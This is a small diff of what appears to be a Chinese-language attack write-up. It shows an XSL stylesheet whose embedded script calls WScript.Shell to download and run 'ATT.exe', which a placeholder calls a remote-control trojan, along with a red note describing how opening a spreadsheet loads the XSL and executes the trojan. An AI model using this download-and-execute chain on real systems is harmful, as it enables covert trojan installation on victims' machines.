@@ -30,6 +30,7 @@ End Sub
 ```
 
 > ATT.xsl
+
 ```
 <xsl:stylesheet 
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
@@ -44,9 +45,12 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd xxxxx -xx 127.0.1.1/ATT.exe 
 </ms:script>
 </xsl:stylesheet>
 ```
+
 > ATT.exe
+
 ```
 这是远控生成的木马
 ```
+
 **<font color=Red face="黑体">将ATT.xsl调用ATT.exe执行,当excel.xsl打开就会进行远程加载ATT.xsl并下载在本地执行ATT.exe木马程序；</font>**
 
